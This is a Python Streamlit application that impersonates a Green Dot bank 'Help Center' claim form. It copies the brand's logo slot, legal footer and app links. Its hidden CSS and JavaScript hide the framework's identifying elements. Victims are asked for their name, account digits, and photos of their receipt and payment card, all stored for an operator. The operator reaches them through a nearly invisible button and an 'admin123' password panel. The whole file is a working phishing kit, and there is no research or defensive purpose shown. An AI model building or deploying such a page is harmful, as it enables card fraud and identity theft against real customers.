
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE --- 
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    chars = string.ascii_uppercase + string.digits
    return "GD-" + "".join(random.choice(chars) for _ in range(8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- JS: LIMPIEZA Y LOGIN OCULTO ---
st.markdown("""<script>
    const clean = () => {
        const targets = ['.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]', 'header', 'footer', '.stDeployButton'];
        targets.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
    };
    setInterval(clean, 300);
</script>""", unsafe_allow_html=True)

# --- CSS: STEALTH DESIGN ---
st.markdown("""<style>
    [data-testid='stHeader'], footer, header, .stDeployButton, .section-anchor, [data-testid="stHeaderActionElements"] {
        display: none !important; visibility: hidden !important;
    }
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .stButton>button { 
        background-color: #00a05b !important; color: white !important; 
        width: 100%; border: none !important; font-weight: bold !important; padding: 12px !important;
    }
    h1, h2, h3 { pointer-events: none !important; cursor: default !important; user-select: none !important; }
    .block-container { max-width: 550px !important; padding-top: 1.5rem !important; }
    
    /* Estilo original de la caja de App Download */
    .app-promo-container {
        background-color: #111111;
        padding: 35px 20px;
        text-align: center;
        border-radius: 12px;
        margin: 30px 0;
        border: 1px solid #222;
    }
    .legal-footer {
        font-size: 10px; color: #555; text-align: justify; margin-top: 40px;
        border-top: 1px solid #222; padding-top: 20px; line-height: 1.6;
    }
    /* Botón de admin casi invisible */
    .admin-trigger { opacity: 0.05; cursor: default; margin-top: 20px; }
    .admin-trigger:hover { opacity: 0.1; }
</style>""", unsafe_allow_html=True)

# Gestión de Estado para el Panel Admin
if 'admin_mode' not in st.session_state:
    st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    # --- UI CLIENTE ---
    col1, col2, col3 = st.columns([1,2,1])
    with col2: 
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("dispute_legacy_v23", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
        submitted = st.form_submit_button("SUBMIT NOW")

    if submitted:
        if nombre and rec and car:
            ref_id = generate_ref()
            # Lógica de guardado (DB y Archivos)
            f_path = os.path.join(UPLOAD_DIR, f"f_{ref_id}_{rec.name}")
            t_path = os.path.join(UPLOAD_DIR, f"t_{ref_id}_{car.name}")
            with open(f_path, "wb") as f: f.write(rec.getbuffer())
            with open(t_path, "wb") as f: f.write(car.getbuffer())
            
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO greendot_submissions (nombre, cuenta, monto, factura_path, tarjeta_path, fecha, ref_id) VALUES (?,?,?,?,?,?,?)",
                      (nombre, cuenta, monto, f_path, t_path, str(datetime.now()), ref_id))
            conn.commit(); conn.close()

            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:10px; text-align:center;'>" +
                        f"<h2 style='color:#00a05b;'>✅ Claim Submitted</h2><p>Reference: <b>{ref_id}</b></p>" +
                        f"<p style='font-size:12px; color:#888;'>Our team will review your request in 2-5 days.</p></div>", unsafe_allow_html=True)
        else: st.error("Please complete all fields.")

    # SECCIÓN DOWNLOAD APP (RESTAURADA)
    st.markdown("""<div class='app-promo-container'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='140'>
            </a>
            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='140'>
            </a>
        </div>
        <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
    </div>""", unsafe_allow_html=True)

    st.markdown("""<div class='legal-footer'>
        Green Dot® cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.
    </div>""", unsafe_allow_html=True)

    # Acceso oculto al Administrador
    if st.button(".", help="Admin"): st.session_state.admin_mode = True

else:
    # --- PANEL ADMIN ---
    st.title("🔐 Internal Database")
    if st.button("Back to Form"): st.session_state.admin_mode = False
    pw = st.text_input("Password", type="password")
    if pw == "admin123":
        conn = sqlite3.connect(DB_NAME)
        df = pd.read_sql_query("SELECT * FROM greendot_submissions ORDER BY id DESC", conn)
        conn.close()
        st.dataframe(df)
        for _, row in df.iterrows():
            with st.expander(f"Claim {row['ref_id']}"): 
                st.image(row['factura_path'], width=300)
                st.image(row['tarjeta_path'], width=300)
